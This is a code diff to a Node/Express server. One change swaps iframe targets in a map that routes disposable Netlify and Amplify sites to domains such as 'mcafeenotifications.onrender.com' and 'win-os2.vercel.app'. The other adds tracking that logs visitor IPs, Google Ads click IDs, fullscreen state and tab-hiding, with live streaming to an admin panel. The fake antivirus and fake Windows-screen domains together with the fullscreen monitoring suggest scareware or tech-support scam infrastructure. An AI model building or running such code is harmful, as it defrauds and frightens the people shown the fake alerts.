@@ -1,4 +1,5 @@
 require("dotenv").config();
+const path = require("path");
 const express = require("express");
 const cors = require("cors");
 const CryptoJS = require("crypto-js");
@@ -85,22 +86,21 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url" },
-    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://web-os4.vercel.app" },
+    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://web-os4.vercel.app" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://win-os2.vercel.app" },
     "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://web-os4.vercel.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://web-os4.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
-    "https://staging.d38r0fqdz8kjft.amplifyapp.com": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
   },
 };
 
@@ -743,6 +743,141 @@ app.post("/admin/reset", async (req, res) => {
     res.status(500).json({ error: err.message });
   }
 });
+
+// ─── Analytics ────────────────────────────────────────────────────
+
+const KEY_ANALYTICS        = "analytics:sessions";
+const ANALYTICS_MAX        = 500;
+const ANALYTICS_SESSION_TTL = 48 * 3600;
+
+const keySession = (id) => `analytics:session:${id}`;
+
+const sseClients = new Set();
+
+function broadcastSSE(type, data) {
+  if (!sseClients.size) return;
+  const msg = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
+  for (const res of sseClients) {
+    try { res.write(msg); } catch { sseClients.delete(res); }
+  }
+}
+
+app.post("/track", async (req, res) => {
+  try {
+    const body = req.body || {};
+    const { sessionId, event } = body;
+    if (!sessionId || !event) {
+      return res.status(400).json({ error: "sessionId and event required" });
+    }
+
+    const ip =
+      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket.remoteAddress ||
+      "unknown";
+
+    const now = Date.now();
+    const sKey = keySession(sessionId);
+    const existing = await redis.hgetall(sKey);
+
+    if (event === "init" || !existing || !existing.id) {
+      const session = {
+        id:          sessionId,
+        event:       event,
+        ip,
+        userAgent:   req.headers["user-agent"] || "",
+        origin:      req.headers.origin || "",
+        timezone:    body.timezone    || "",
+        gclid:       body.gclid       || "",
+        url:         body.url         || "",
+        referrer:    body.referrer    || "",
+        language:    body.language    || "",
+        screenWidth: body.screenWidth || 0,
+        screenHeight:body.screenHeight|| 0,
+        startTime:   now,
+        lastSeen:    now,
+        duration:    0,
+        clicks:      0,
+        isFullscreen:"false",
+        isHidden:    "false",
+        hiddenCount: 0,
+      };
+      const tx = redis.multi();
+      tx.hmset(sKey, session);
+      tx.expire(sKey, ANALYTICS_SESSION_TTL);
+      tx.zadd(KEY_ANALYTICS, now, sessionId);
+      tx.zremrangebyrank(KEY_ANALYTICS, 0, -(ANALYTICS_MAX + 1));
+      await tx.exec();
+      broadcastSSE("session", session);
+    } else {
+      const updates = { lastSeen: now, event };
+      if (body.duration    !== undefined) updates.duration    = Number(body.duration)    || 0;
+      if (body.clicks      !== undefined) updates.clicks      = Number(body.clicks)      || 0;
+      if (body.isFullscreen!== undefined) updates.isFullscreen = String(body.isFullscreen);
+      if (body.isHidden    !== undefined) {
+        updates.isHidden = String(body.isHidden);
+        if (body.isHidden === true || body.isHidden === "true") {
+          updates.hiddenCount = (parseInt(existing.hiddenCount, 10) || 0) + 1;
+        }
+      }
+      if (body.timezone) updates.timezone = body.timezone;
+      if (body.gclid)    updates.gclid    = body.gclid;
+      if (body.url)      updates.url      = body.url;
+
+      await redis.hmset(sKey, updates);
+      await redis.expire(sKey, ANALYTICS_SESSION_TTL);
+      broadcastSSE("update", { ...existing, ...updates, id: sessionId });
+    }
+
+    res.status(200).json({ ok: true });
+  } catch (err) {
+    console.error("[track]", err.message);
+    res.status(500).json({ error: "tracking failed" });
+  }
+});
+
+app.get("/admin/analytics", async (req, res) => {
+  try {
+    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, 199);
+    const sessions = [];
+    for (const id of ids) {
+      const s = await redis.hgetall(keySession(id));
+      if (s && s.id) sessions.push(s);
+    }
+    res.json({ sessions, total: sessions.length });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.get("/admin/stream", (req, res) => {
+  res.setHeader("Content-Type", "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Connection", "keep-alive");
+  res.flushHeaders();
+  res.write(": connected\n\n");
+
+  sseClients.add(res);
+  const keepalive = setInterval(() => {
+    try { res.write(": ping\n\n"); } catch { clearInterval(keepalive); }
+  }, 25000);
+
+  req.on("close", () => {
+    clearInterval(keepalive);
+    sseClients.delete(res);
+  });
+});
+
+app.get("/admin", (_req, res) => {
+  res.sendFile(path.join(__dirname, "admin.html"));
+});
+
+app.get("/tracker.js", (_req, res) => {
+  res.setHeader("Content-Type", "application/javascript");
+  res.sendFile(path.join(__dirname, "tracker.js"));
+});
+
+// ─── end Analytics ────────────────────────────────────────────────
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
